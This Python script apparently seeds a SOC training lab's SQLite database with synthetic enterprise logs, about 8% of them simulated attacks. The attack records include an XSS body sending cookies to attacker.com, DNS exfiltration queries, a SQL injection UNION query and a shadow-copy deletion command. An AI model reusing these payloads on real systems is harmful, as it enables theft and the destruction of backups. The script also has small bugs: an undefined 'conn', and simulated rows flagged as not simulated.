import sqlite3
import json
import random
import time
import os
import uuid

DB_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '../data/soclab.db'))

HOSTNAMES = ['WORKSTATION-01', 'WORKSTATION-02', 'FINANCE-PC', 'DEV-SERVR-01', 'DC-PRIMARY-01', 'WEB-PROD-01', 'VPN-GATEWAY', 'SQL-PROD-01', 'GATEWAY-01', 'FIREWALL-01']
USERS = ['j.doe', 'a.smith', 'admin_corp', 'm.taylor', 'svc_backup', 'dev_user', 'system_acc', 'krbtgt', 'sql_svc']
IPS = ['192.168.1.105', '192.168.1.112', '10.0.4.15', '10.0.4.88', '172.16.0.4', '185.220.101.5', '45.33.32.156', '192.168.1.99', '10.0.0.1']
PROCESSES = ['cmd.exe', 'powershell.exe', 'explorer.exe', 'chrome.exe', 'svchost.exe', 'lsass.exe', 'python.exe', 'vssadmin.exe', 'schtasks.exe', 'mimikatz.exe', 'procdump.exe']

ATTACK_PAYLOADS = {
    'brute_force': lambda: {
        'source_type': 'windows_event',
        'host_name': 'DC-PRIMARY-01',
        'severity': 'HIGH',
        'event_id': 4625,
        'process_name': None,
        'user_name': 'administrator',
        'src_ip': '185.220.101.5',
        'raw_payload': json.dumps({"EventID": 4625, "TargetUserName": "administrator", "Status": "0xC000006D", "SubStatus": "0xC000006A", "IpAddress": "185.220.101.5", "LogonType": 3, "CountThisMinute": random.randint(5, 30)})
    },
    'powershell_enc': lambda: {
        'source_type': 'sysmon',
        'host_name': 'FINANCE-PC',
        'severity': 'CRITICAL',
        'event_id': 1,
        'process_name': 'powershell.exe',
        'user_name': 'm.taylor',
        'src_ip': '10.0.4.15',
        'raw_payload': json.dumps({"EventID": 1, "Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...", "ParentImage": "C:\\Windows\\System32\\winword.exe", "ParentPID": 5678})
    },
    'sqli': lambda: {
        'source_type': 'apache',
        'host_name': 'WEB-PROD-01',
        'severity': 'HIGH',
        'event_id': None,
        'process_name': None,
        'user_name': None,
        'src_ip': '45.33.32.156',
        'raw_payload': json.dumps({"request": "GET /api/users?id=1' UNION SELECT username, password_hash FROM users-- HTTP/1.1", "status": 200, "user_agent": "sqlmap/1.5#stable", "response_bytes": 15240})
    },
    'dns_tunnel': lambda: {
        'source_type': 'zeek',
        'host_name': 'WORKSTATION-01',
        'severity': 'HIGH',
        'event_id': None,
        'process_name': None,
        'user_name': None,
        'src_ip': '192.168.1.105',
        'raw_payload': json.dumps({"query": f"{uuid.uuid4().hex[:16]}.exfil.attacker.com", "qtype": "TXT", "bytes_out": random.randint(2000, 4096), "query_count": random.randint(10, 100)})
    },
    'ransomware': lambda: {
        'source_type': 'sysmon',
        'host_name': 'DEV-SERVR-01',
        'severity': 'CRITICAL',
        'event_id': 1,
        'process_name': 'vssadmin.exe',
        'user_name': 'SYSTEM',
        'src_ip': '10.0.0.1',
        'raw_payload': json.dumps({"EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "User": "NT AUTHORITY\\SYSTEM", "ParentImage": "C:\\Windows\\System32\\services.exe"})
    },
    'lsass_dump': lambda: {
        'source_type': 'sysmon',
        'host_name': 'DC-PRIMARY-01',
        'severity': 'CRITICAL',
        'event_id': 10,
        'process_name': 'lsass.exe',
        'user_name': 'SYSTEM',
        'src_ip': '10.0.4.88',
        'raw_payload': json.dumps({"EventID": 10, "Image": "C:\\Windows\\System32\\lsass.exe", "TargetImage": "C:\\Windows\\Temp\\lsass.dmp", "GrantedAccess": "0x1FFFFF", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+C:\\Tools\\mimikatz.exe"})
    },
    'kerberoast': lambda: {
        'source_type': 'windows_event',
        'host_name': 'DC-PRIMARY-01',
        'severity': 'HIGH',
        'event_id': 4769,
        'process_name': None,
        'user_name': 'svc_backup',
        'src_ip': '10.0.4.88',
        'raw_payload': json.dumps({"EventID": 4769, "TargetUserName": "svc_backup", "ServiceName": "MSSQLSvc/SQL-PROD-01.corp.internal:1433", "TicketOptions": "0x40810000", "TicketEncryptionType": "0x17"})
    },
    'scheduled_task': lambda: {
        'source_type': 'windows_event',
        'host_name': 'WORKSTATION-01',
        'severity': 'HIGH',
        'event_id': 4698,
        'process_name': 'schtasks.exe',
        'user_name': 'j.doe',
        'src_ip': '192.168.1.105',
        'raw_payload': json.dumps({"EventID": 4698, "TaskName": "\\Microsoft\\Windows\\Updater\\SystemCheck", "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><task><Triggers><LogonTrigger><UserId>CORP\\\\j.doe</UserId></LogonTrigger></Triggers><Actions><Exec><Command>powershell.exe</Command><Arguments>-enc JABjAGwAaQBlAG4AdAA</Arguments></Exec></Actions></task>"})
    },
    'golden_ticket': lambda: {
        'source_type': 'windows_event',
        'host_name': 'DC-PRIMARY-01',
        'severity': 'CRITICAL',
        'event_id': 4624,
        'process_name': None,
        'user_name': 'KRBTGT',
        'src_ip': '10.0.4.88',
        'raw_payload': json.dumps({"EventID": 4624, "TargetUserName": "Administrator", "LogonType": 3, "AuthenticationPackage": "Kerberos", "WorkstationName": "ATTACKER-PC", "IpAddress": "10.0.4.88", "KeyLength": 0})
    },
    'arp_spoof': lambda: {
        'source_type': 'suricata',
        'host_name': 'GATEWAY-01',
        'severity': 'HIGH',
        'event_id': None,
        'process_name': None,
        'user_name': None,
        'src_ip': '192.168.1.99',
        'raw_payload': json.dumps({"alert": "ARP Spoofing Detected", "protocol": "ARP", "src_mac": "00:1A:2B:3C:4D:5E", "target_ip": "192.168.1.1", "spoofed_ip": "192.168.1.105", "packet_count": random.randint(50, 500)})
    },
    'xss_exfil': lambda: {
        'source_type': 'nginx',
        'host_name': 'WEB-PROD-01',
        'severity': 'HIGH',
        'event_id': None,
        'process_name': None,
        'user_name': None,
        'src_ip': '45.33.32.156',
        'raw_payload': json.dumps({"request": "POST /submit-comment HTTP/1.1", "body": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>", "user_agent": "Mozilla/5.0 (XSS Payload)", "status": 200})
    },
    'port_scan': lambda: {
        'source_type': 'firewall',
        'host_name': 'FIREWALL-01',
        'severity': 'MEDIUM',
        'event_id': None,
        'process_name': None,
        'user_name': None,
        'src_ip': '185.220.101.5',
        'raw_payload': json.dumps({"action": "DENY", "protocol": "TCP", "src_port": random.randint(49000, 65535), "dest_port": random.choice([22, 80, 443, 3389, 445, 8080]), "flags": "SYN", "bytes": 44, "signature": "Nmap SYN Scan", "count_30s": random.randint(500, 2000)})
    }
}

def inject_malicious_logs(cursor, count=500, ratio=0.08):
    attack_keys = list(ATTACK_PAYLOADS.keys())
    now = time.time()
    batch = []

    for i in range(count):
        if random.random() < ratio:
            attack_key = random.choice(attack_keys)
            generator = ATTACK_PAYLOADS[attack_key]
            log_data = generator()
        else:
            log_data = generate_benign_log()

        log_id = f"LOG-{uuid.uuid4().hex[:8].upper()}"
        ts_offset = random.randint(0, 7 * 86400)
        ts_iso = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - ts_offset))

        batch.append((
            log_id, ts_iso,
            log_data['source_type'],
            log_data['host_name'],
            log_data['severity'],
            log_data['event_id'],
            log_data['process_name'],
            log_data['user_name'],
            log_data['src_ip'],
            random.choice(['10.0.0.1', '192.168.1.1', '172.16.0.1']),
            log_data['raw_payload'],
            0
        ))

        if len(batch) >= 5000:
            cursor.executemany("""
                INSERT INTO logs (id, timestamp, source_type, host_name, severity, event_id, process_name, user_name, src_ip, dest_ip, raw_payload, is_simulated)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, batch)
            conn.commit()
            batch = []

    return batch

def generate_benign_log():
    sources = ['windows_event', 'sysmon', 'firewall', 'dns', 'suricata', 'zeek', 'wazuh', 'apache', 'nginx', 'o365']
    severities = ['INFO', 'INFO', 'INFO', 'INFO', 'WARNING', 'WARNING']
    src_type = random.choice(sources)
    host = random.choice(HOSTNAMES)
    user = random.choice(USERS)
    proc = random.choice(PROCESSES)
    src_ip = random.choice(IPS)
    sev = random.choice(severities)

    event_id = None
    payload = {}

    if src_type == 'windows_event':
        event_id = random.choice([4624, 4672, 4720, 4634, 4648])
        payload = {
            "EventID": event_id,
            "LogonType": random.choice([2, 10, 11]),
            "TargetUserName": user,
            "WorkstationName": host,
            "IpAddress": src_ip,
            "Status": "0x0"
        }
    elif src_type == 'sysmon':
        event_id = random.choice([1, 3, 7, 11])
        payload = {
            "EventID": event_id,
            "Image": f"C:\\Windows\\System32\\{proc}",
            "CommandLine": f"{proc} /c echo System Diagnostic",
            "ParentImage": "C:\\Windows\\System32\\explorer.exe",
            "User": f"CORP\\{user}"
        }
    elif src_type == 'firewall':
        payload = {
            "action": random.choice(['ALLOW', 'ALLOW', 'ALLOW', 'DENY']),
            "src_port": random.randint(1024, 65535),
            "dest_port": random.choice([80, 443, 53, 123]),
            "bytes": random.randint(64, 8192)
        }
    elif src_type == 'dns':
        domains = ['corp.internal', 'microsoft.com', 'windowsupdate.com', 'office365.com']
        payload = {
            "query": f"{random.choice(['mail', 'api', 'vpn', 'update', 'teams', 'sharepoint'])}.{random.choice(domains)}",
            "qtype": random.choice(["A", "AAAA", "MX", "CNAME"]),
            "rcode": "NOERROR"
        }
    else:
        payload = {
            "message": f"Normal system operational telemetry for {host}",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "status_code": 200
        }

    return {
        'source_type': src_type,
        'host_name': host,
        'severity': sev,
        'event_id': event_id,
        'process_name': proc if src_type == 'sysmon' else None,
        'user_name': user if src_type in ['windows_event', 'sysmon'] else None,
        'src_ip': src_ip,
        'raw_payload': json.dumps(payload)
    }


def generate_logs(count=50000):
    print(f"Generating {count} realistic enterprise log records with attack vector injections...")
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    now = time.time()
    batch = []

    for i in range(count):
        if random.random() < 0.08:
            attack_key = random.choice(list(ATTACK_PAYLOADS.keys()))
            generator = ATTACK_PAYLOADS[attack_key]
            log_data = generator()
        else:
            log_data = generate_benign_log()

        log_id = f"LOG-SEED-{i+1:06d}"
        ts_offset = random.randint(0, 7 * 86400)
        ts_iso = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - ts_offset))

        batch.append((
            log_id, ts_iso,
            log_data['source_type'],
            log_data['host_name'],
            log_data['severity'],
            log_data['event_id'],
            log_data['process_name'],
            log_data['user_name'],
            log_data['src_ip'],
            random.choice(['10.0.0.1', '192.168.1.1', '172.16.0.1']),
            log_data['raw_payload'],
            0
        ))

        if len(batch) >= 5000:
            cursor.executemany("""
                INSERT INTO logs (id, timestamp, source_type, host_name, severity, event_id, process_name, user_name, src_ip, dest_ip, raw_payload, is_simulated)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, batch)
            conn.commit()
            batch = []

    if batch:
        cursor.executemany("""
            INSERT INTO logs (id, timestamp, source_type, host_name, severity, event_id, process_name, user_name, src_ip, dest_ip, raw_payload, is_simulated)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, batch)
        conn.commit()

    conn.close()
    print("Seed dataset generation complete with malicious vector injections!")

if __name__ == '__main__':
    generate_logs(50000)
